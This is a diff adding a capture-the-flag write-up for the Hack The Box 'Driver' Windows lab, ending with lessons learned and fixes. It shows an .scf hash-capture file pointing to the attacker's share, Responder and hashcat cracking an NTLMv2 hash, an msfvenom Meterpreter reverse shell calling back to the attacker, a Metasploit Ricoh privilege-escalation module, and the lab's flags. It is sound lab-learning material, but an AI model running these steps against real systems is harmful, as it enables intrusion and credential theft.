@@ -1,0 +1,275 @@
+# Driver Write-Up
+
+Target: 10.10.11.106
+
+---
+
+## Introduction
+    - Objective: Obtain the user and root flag on this Windows System by using exploitation and priviledge escalation techniques. This will be my first box using searchsploit!
+    - Tools:
+        Nmap, SMBClient, Responder, Hashcat, Evil-WinRM, msfvenom, msfconsole (Metasploit), Meterpreter
+
+---
+
+## Initial Reconnaissance
+    - Port Scanning:
+        - Command: nmap -p- -sC -sV --min-rate=1000 -T4 10.10.11.106
+        - Output: 
+            PORT     STATE SERVICE      VERSION
+            80/tcp   open  http         Microsoft IIS httpd 10.0
+            | http-methods:
+            |_  Potentially risky methods: TRACE
+            |_http-server-header: Microsoft-IIS/10.0
+            |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+            | http-auth: 
+            | HTTP/1.1 401 Unauthorized\x0D
+            |_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+            135/tcp  open  msrpc        Microsoft Windows RPC 
+            445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+            5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+            |_http-title: Not Found
+            |_http-server-header: Microsoft-HTTPAPI/2.0
+            Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+            Host script results:
+            | smb2-security-mode: 
+            |   3:1:1: 
+            |_    Message signing enabled but not required
+            | smb-security-mode: 
+            |   account_used: guest
+            |   authentication_level: user
+            |   challenge_response: supported
+            |_  message_signing: disabled (dangerous, but default)
+            | smb2-time: 
+            |   date: 2025-04-17T04:48:35
+            |_  start_date: 2025-04-16T20:44:51
+            |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+    - Observations: 
+        - IIS server is asking for admin password
+        - msrpc (Microsoft Remote Procedure Call) is used for file sharing, printing, and Active Directory operations
+        - Microsoft-ds is for Active Directory services that uses msrpc for communication
+            this box may be an attack on Active Directory
+        - smb message_signing is disabled which opens it up for man-in-the-middle attacks
+        - Port 5985 is open, Windows Remote Management
+
+---
+
+## Enumeration
+    - Service Exploration:
+        - Service 1: List SMB shares
+            - Command: smbclient -L //10.10.11.106 -U Tony
+            - Output:
+                ┌─[✗]─[mrincognito@parrot]─[/]
+                └──╼ $smbclient -L //10.10.11.106 -U Tony
+                Password for [WORKGROUP\Tony]: liltony
+
+                    Sharename       Type      Comment
+                    ---------       ----      -------
+                    ADMIN$          Disk      Remote Admin
+                    C$              Disk      Default share
+                    IPC$            IPC       Remote IPC
+
+        - Service 2: Accessible Share
+            - Command: smbclient //10.10.11.106/IPC$ -U Tony                                       
+                Password for [WORKGROUP\Tony]: liltony
+            - Output: smb: \>
+        - Service 3:
+            - Command:
+            - Output:
+        - Service 4:
+            - Command:
+            - Output:
+        - Service 5:
+            - Command:
+            - Output:
+        - Service 6:
+            - Command:
+            - Output:
+        - Service 7:
+            - Command:
+            - Output:
+            
+    - Manual Checks: 
+        - Checked port 80 web server, prompted with sign in screen
+        - Looked up SMB RCE attacks and came across CVE-2020-0796 for SMB 3.1.1, it's a buffer overflow attack and relies on SMBv3 compression. At this point in time im not sure if this is the vulnerability that the box wants me to use so im going to continue to do more research.
+        - Looked up SMB share upload attacks and found an article outlining a relay attack for SMB that has message signing disabled, the default settings. Link: https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/ , https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+        
+    - Key Findings:
+        -10.10.11.106:80 Username: admin Password: admin
+        -email found with domain: support@driver.htb
+        -Firmware updates tab on web server allows to upload firmware to 4 possible printers
+        -.scf file will automatically run
+        -DRIVER/TONY user
+        -THE RESPONDER THAT COMES WITH PARROTOS DOESNT WORK. JUST WASTED 3 HOURS. use this git for the future: https://github.com/lgandx/Responder.git\
+        
+---
+
+## Exploitation
+    - Create the .scf file:
+        [Shell]
+        Command=2
+        IconFile=\\10.10.16.3\share\test.ico
+        [Taskbar]
+        Command=ToggleDesktop
+        
+    - Initial Access: Using Responder to capture hashes, upload the .scf to intiate
+        - Command: sudo python3 Responder.py -I tun0
+        - Output: 
+            [SMB] NTLMv2-SSP Client   : 10.10.11.106
+            [SMB] NTLMv2-SSP Username : DRIVER\tony
+            [SMB] NTLMv2-SSP Hash     : tony::DRIVER:648be95171690374:23309F9180ACC7DC8FD508ACF64DC26C:01010000000000000084C3E0CDAEDB01B5244CB97C3F930C0000000002000800380046003800450001001E00570049004E002D00430050005A004D005000310045004F0044004700470004003400570049004E002D00430050005A004D005000310045004F004400470047002E0038004600380045002E004C004F00430041004C000300140038004600380045002E004C004F00430041004C000500140038004600380045002E004C004F00430041004C00070008000084C3E0CDAEDB0106000400020000000800300030000000000000000000000000200000EAE5883EC728E7585DB4803F9CE43EB006737FDCC24CA3CF1AB4E2A0601FB0C60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000
+    - Cracking the Hash: hashcat
+        - Command: hashcat -m 5600 tony.hash -a 0 /usr/share/hashcat/rockyou.txt
+        - Output: TONY::DRIVER:648be95171690374:23309f9180acc7dc8fd508acf64dc26c:01010000000000000084c3e0cdaedb01b5244cb97c3f930c0000000002000800380046003800450001001e00570049004e002d00430050005a004d005000310045004f0044004700470004003400570049004e002d00430050005a004d005000310045004f004400470047002e0038004600380045002e004c004f00430041004c000300140038004600380045002e004c004f00430041004c000500140038004600380045002e004c004f00430041004c00070008000084c3e0cdaedb0106000400020000000800300030000000000000000000000000200000eae5883ec728e7585db4803f9ce43eb006737fdcc24ca3cf1ab4e2a0601fb0c60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000:liltony
+    - Shell Access: Evil Windows Remote Management
+        - Command: evil-winrm -i 10.10.11.106 -u tony -p 5985 -p liltony
+        - Output: *Evil-WinRM* PS C:\Users\tony\Documents> 
+
+## User Flag: Located on tony's Desktop C:\Users\tony\Desktop>
+    - Command: type user.txt
+    - Output: 1d7de5b025a664b896d6d65bf43f3fd5      
+
+---
+
+## Privilege Escalation
+    - Step 1: Information Gathering:
+        - System Info: 
+            - Command: sysinfo
+            - Output:
+                Computer        : DRIVER
+                OS              : Windows 10 (10.0 Build 10240).
+                Architecture    : x64
+                System Language : en_US
+                Domain          : WORKGROUP
+                Logged On Users : 1
+                Meterpreter     : x64/windows
+        - User Context: 
+            - Command: getuid
+            - Output: DRIVER\tony
+            
+        - Automated Tools: setting up a session for metasploit local_exploit_suggester
+            - Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe >
+                shell.exe
+            - Output: shell.exe
+            
+            - Command: *Evil-WinRM* PS C:\Users\tony\Desktop> upload shell.exe C:\Users\tony\Desktop\shell.exe
+            - Output: Info: Uploading /home/mrincognito/Desktop/LABS/Driver/shell.exe to C:\Users\tony\Desktop\shell.exe
+                Data: 9556 bytes of 9556 bytes copied
+                Info: Upload successful!
+            
+            - Command: msfconsole
+                use exploit/multi/handler
+                set payload windows/x64/meterpreter/reverse_tcp
+                set lhost tun0
+                set lport 4444
+                run
+            - Output: [*] Started reverse TCP handler on 10.10.16.3:4444
+            
+            - Command: *Evil-WinRM* PS C:\Users\tony\Desktop> .\shell.exe
+            - Output: [*] Started reverse TCP handler on 10.10.16.3:4444 
+                [*] Sending stage (203846 bytes) to 10.10.11.106
+                [*] Sending stage (203846 bytes) to 10.10.11.106
+                [*] Meterpreter session 2 opened (10.10.16.3:4444 -> 10.10.11.106:49538) at 2025-04-16 20:47:55 -0400
+
+                (Meterpreter 2)(C:\Windows\system32) > [*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.10.11.106:49539) at 2025-04-16 20:47:56 -0400
+            
+            - Command: ps
+            - Output:   PID	  PPID	Name			Arch  Session	User			Path
+                2100  956   cmd.exe                  x64   1        DRIVER\tony  C:\Windows\System32\cmd.exe
+
+            
+            - Command: migrate 2100
+            - Output: [*] Migrating from 564 to 2100...
+                [*] Migration completed successfully.
+            
+            - Command: ctl+z
+                Background session 1? [y/N] y
+
+    - Step 2: Identify Vectors:
+        - SUID Binaries:
+            - Command:
+            - Output:
+        - Cron Jobs:
+            - Command:
+            - Output:
+        - Kernel Exploits:
+            - Command:
+            - Output:
+            
+        - Misconfigurations: Using local_exploit_suggester
+            - Command: use multi/recon/local_exploit_suggester
+                set session 1
+                run
+            - Output:
+            #   Name                                    Potentially Vulnerable?  Check Result
+            14  exploit/windows/local/ricoh_driver_privesc	    Yes               The target appears to be vulnerable. Ricoh driver directory has full permissions
+            
+    - Step 3: Exploit the Vector:
+        - Command:  use exploit/windows/local/ricoh_driver_privesc
+            set payload windows/x64/meterpreter/reverse_tcp
+            set session 1
+            set lhost tun0
+            run
+        - Output: 
+            [*] Started reverse TCP handler on 10.10.16.3:4444 
+            [*] Running automatic check ("set AutoCheck false" to disable)
+            [+] The target appears to be vulnerable. Ricoh driver directory has full permissions
+            [*] Adding printer hpTKR...
+            [*] Sending stage (203846 bytes) to 10.10.11.106
+            [+] Deleted C:\Users\tony\AppData\Local\Temp\jGUwVzbvB.bat
+            [+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
+            [*] Meterpreter session 3 opened (10.10.16.3:4444 -> 10.10.11.106:49540) at 2025-04-16 21:09:48 -0400
+            [*] Deleting printer hpTKR
+
+            (Meterpreter 3)(C:\Windows\system32) > 
+
+    - Step 4: Verify Access:
+        - Command: getuid 
+        - Output: Server username: NT AUTHORITY\SYSTEM
+
+---
+
+## Post-Exploitation
+    - Flag Retrieval: In the Administrator Desktop
+        - Command: (Meterpreter 3)(C:\Users\Administrator\Desktop) > cat root.txt
+        - Output: ed05187f0c892fb7a587cb51825d58d6
+    - Persistence (Optional):
+    - Evidence:
+
+---
+
+## Conclusion
+    - Summary: In "Driver" (10.10.11.106), I used Nmap to find ports 80, 135, 445, and 5985, spotting an IIS web server with basic auth. I logged in with admin:admin, uploaded a .SCF file to an SMB share, and captured an NTLM hash with Responder. Cracking it with Hashcat gave me tony:liltony, letting me use Evil-WinRM for a shell. I created a Meterpreter payload with msfvenom, uploaded it, and got a session. The local exploit suggester found a Ricoh driver vuln, which I exploited to become NT AUTHORITY\SYSTEM, grabbing the user flag (1d7de5b025a664b896d6d65bf43f3fd5) and root flag (ed05187f0c892fb7a587cb51825d58d6). It was very tough because I have not worked with Metasploit, Evil-WinRM, Msfvenom, or capturing NTLM hashes. I had to refer to the write-up, however I had fun and learned a lot.
+    - Lessons Learned: 
+      - Always scan all ports with Nmap (`-p-`)—I missed port 5985, which Evil-WinRM uses for remote access.  
+      - Download Responder from GitHub (not ParrotOS’s default) for reliable hash capturing.  
+      - Metasploit’s `multi/handler` catches payload connections like `nc`.  
+      - SMB logins work with Evil-WinRM due to Windows Single Sign-On (SSO).  
+      - Upload a reverse shell executable via Evil-WinRM to get a Meterpreter session for better control.  
+      - Use msfvenom to create payloads (e.g., `windows/x64/meterpreter/reverse_tcp`).  
+      - `.SCF` files auto-authenticate when someone browses the SMB share, leaking NTLM hashes.  
+      - Hashcat’s `-m 5600` mode cracks NTLMv2 hashes.  
+      - Windows services may lack an interactive shell—commands run but you can’t see output in real-time.  
+      - Metasploit’s `local_exploit_suggester` scans for Privesc exploits if you have a session.
+    - Fixes:
+      - Change the Web Login Password**: The website used a super weak password (`admin:admin`). Use a strong, unique password (like `X9m#kP$vL2qW`) to stop others from logging in easily.  
+      - Turn On SMB Message Signing**: SMB had message signing off, letting me steal the user’s hash with a `.SCF` file. Turn it on in Windows settings to block these attacks.  
+      - Use a Better Password for Tony**: The password `liltony` was too easy to crack. Make it strong (e.g., `P@ssw0rd!2025`) so it’s harder to guess.  
+      - Limit Who Can Upload Files**: The website let me upload a `.SCF` file to the SMB share. Add a rule to only allow safe file types (like `.txt`) or block uploads for untrusted users.  
+      - Fix the Ricoh Printer Driver**: The Ricoh driver had bad permissions, letting me gain full control. Update the driver to the latest version or fix its permissions so only admins can change it.  
+      - Turn Off WinRM If Not Needed**: WinRM (port 5985) let me log in with Tony’s password. If you don’t need it, disable it in Windows to stop remote logins.
+---
+
+## Appendix
+    - Additional Details:
+        The web server on port 80 (IIS) used HTTP Basic Authentication, which I bypassed with admin:admin. I could have used SearchSploit to find SMB exploits (e.g., `searchsploit smb 3.1.1`) but focused on the relay attack instead. The Ricoh driver vuln was specific to printer software—checking installed drivers with `driverquery` might have helped spot it manually. I also missed enumerating user permissions (`whoami /all`) before Privesc, which could have shown more attack paths.
+    - Tools and Exploits:
+        - Nmap: Port scanning.  
+        - SMBClient: Listed and accessed SMB shares.  
+        - Responder: Captured NTLM hashes via SMB relay.  
+        - Hashcat: Cracked NTLMv2 hashes (`-m 5600`).  
+        - Evil-WinRM: Remote shell access via WinRM.  
+        - msfvenom: Created Meterpreter payloads.  
+        - msfconsole: Managed exploits and sessions.  
+        - Meterpreter: Interactive shell for post-exploitation.  
+        - Metasploit Modules: `multi/handler` (caught payload connections), `multi/recon/local_exploit_suggester` (found Privesc vulns), `exploit/windows/local/ricoh_driver_privesc` (exploited Ricoh driver vuln).
